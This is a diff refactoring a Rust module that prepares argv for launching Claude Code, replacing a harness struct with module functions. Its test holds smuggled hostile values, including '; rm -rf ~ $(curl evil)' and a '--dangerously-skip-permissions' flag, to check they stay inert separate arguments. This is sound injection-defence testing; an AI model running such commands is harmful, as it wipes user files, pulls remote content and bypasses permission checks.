@@ -1,11 +1,8 @@
 //! Prepares native Claude Code launches.
 
-use pwf_application::{
-    ClaudeAgentSessionClient,
-    pending_work::session::{AgentLaunch, AgentProbe},
-};
+use pwf_application::pending_work::session::{AgentLaunch, AgentProbe};
 
-use super::{argv::LaunchArgv, probe};
+use super::argv::LaunchArgv;
 use crate::session::claude_effort::ClaudeEffort;
 
 const BINARY: &str = "claude";
@@ -28,68 +25,31 @@ impl From<&AgentLaunch> for ClaudeLaunchPlan {
     }
 }
 
-/// Probes and prepares native Claude Code launches.
-#[derive(Debug, Clone, Copy, Default)]
-pub struct ClaudeHarness;
-
-impl ClaudeHarness {
-    /// Probes the Claude Code binary.
-    #[must_use]
-    pub fn probe() -> AgentProbe {
-        probe(BINARY)
-    }
-
-    /// Returns the exact prepared Claude Code argv for previewing.
-    #[must_use]
-    pub fn preview(launch: &AgentLaunch) -> Vec<String> {
-        Self::prepare(launch).argv
-    }
-
-    /// Prepares Claude Code argv from the provider-neutral launch.
-    #[must_use]
-    pub fn prepare(launch: &AgentLaunch) -> PreparedClaudeLaunch {
-        let ClaudeLaunchPlan {
-            title,
-            model,
-            effort,
-            prompt,
-        } = ClaudeLaunchPlan::from(launch);
-        let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
-        if let Some(model) = model {
-            argv = argv.flag("--model", model);
-        }
-        argv = argv.flag("--effort", effort.as_str().to_string());
-        PreparedClaudeLaunch {
-            argv: argv.into_guarded(prompt),
-        }
-    }
+pub(super) fn probe() -> AgentProbe {
+    super::probe(BINARY)
 }
 
-impl ClaudeAgentSessionClient for ClaudeHarness {
-    fn probe(&self) -> AgentProbe {
-        Self::probe()
-    }
-
-    fn preview(&self, launch: &AgentLaunch) -> Vec<String> {
-        Self::preview(launch)
-    }
-
-    fn prepare(&self, launch: &AgentLaunch) -> Vec<String> {
-        Self::prepare(launch).argv
-    }
+pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
+    prepare_argv(launch)
 }
 
-/// Contains prepared native Claude Code argv.
-pub struct PreparedClaudeLaunch {
-    argv: Vec<String>,
+pub(super) fn prepare(launch: &AgentLaunch) -> Vec<String> {
+    prepare_argv(launch)
 }
 
-impl PreparedClaudeLaunch {
-    /// Returns the prepared argv.
-    #[must_use]
-    pub fn argv(&self) -> &[String] {
-        &self.argv
+fn prepare_argv(launch: &AgentLaunch) -> Vec<String> {
+    let ClaudeLaunchPlan {
+        title,
+        model,
+        effort,
+        prompt,
+    } = ClaudeLaunchPlan::from(launch);
+    let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
+    if let Some(model) = model {
+        argv = argv.flag("--model", model);
     }
+    argv = argv.flag("--effort", effort.as_str().to_string());
+    argv.into_guarded(prompt)
 }
 
 #[cfg(test)]
@@ -97,7 +57,7 @@ mod tests {
     use pwf_application::pending_work::session::AgentLaunch;
     use pwf_models::session::{Agent, SessionEffort};
 
-    use super::ClaudeHarness;
+    use super::prepare;
 
     #[test]
     fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
@@ -111,20 +71,20 @@ mod tests {
             effort: SessionEffort::XHigh,
         };
 
-        let prepared = ClaudeHarness::prepare(&launch);
+        let prepared = prepare(&launch);
 
         assert_eq!(
-            prepared.argv(),
-            [
-                "claude",
-                "--name",
-                "--dangerously-skip-permissions",
-                "--model",
-                "sonnet",
-                "--effort",
-                "xhigh",
-                "--",
-                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions",
+            prepared,
+            vec![
+                "claude".to_string(),
+                "--name".to_string(),
+                "--dangerously-skip-permissions".to_string(),
+                "--model".to_string(),
+                "sonnet".to_string(),
+                "--effort".to_string(),
+                "xhigh".to_string(),
+                "--".to_string(),
+                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
             ]
         );
     }
